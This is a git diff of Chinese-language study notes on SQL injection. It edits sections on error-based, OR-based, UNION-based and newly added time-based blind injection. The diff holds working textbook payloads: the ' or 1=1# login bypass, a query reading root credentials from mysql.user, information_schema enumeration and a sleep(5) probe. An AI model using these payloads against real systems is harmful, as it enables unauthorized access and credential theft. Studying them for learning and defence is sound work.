@@ -15,18 +15,22 @@ select user,password from mysql.user where user = 'root';
 数字是不可以作为字段的
 
 #### 基于错误注入
-比如：在用户名输入框中输入:’ or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：
-select * from users where username='' or 1=1#' and password=md5('')
-　　语义分析：“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：
-select * from users where username='' or 1=1#' and password=md5('')
-等价于
-select * from users where username='' or 1=1
+输入单引号，用于判断是否语法报错进而得知是否可以注入
 
 
 
 #### 基于or的注入 获取一个表
 select user,password from mysql.user where user = 'root' or 1=1；
 where后的条件为真
+
+
+比如：在用户名输入框中输入:’ or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：
+select * from users where username='' or 1=1#' and password=md5('')
+　　语义分析：“#”在mysql中是注释符,--也可以用作注释，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：
+select * from users where username='' or 1=1#' and password=md5('')
+等价于
+select * from users where username='' or 1=1
+
 
 
 #### 基于union的注入 获取多个表
@@ -54,6 +58,9 @@ select TABLE_SCHEMA，GROUP_CONCAT(TABLE_NAME) from information_schema.tables GR
 通过前面获取的库与表获取表中的所有列
 select COLOUMN_NAME from information_schema.columns WHERE TABLE_SCHEMA='database' and TABLE_NAME='table';
 
+
+#### 基于时间的盲注
+1' and sleep(5)--'
 
 #### 参考文章
 - [利用SQL注入漏洞登录后台](https://www.cnblogs.com/sdya/p/4568548.html)
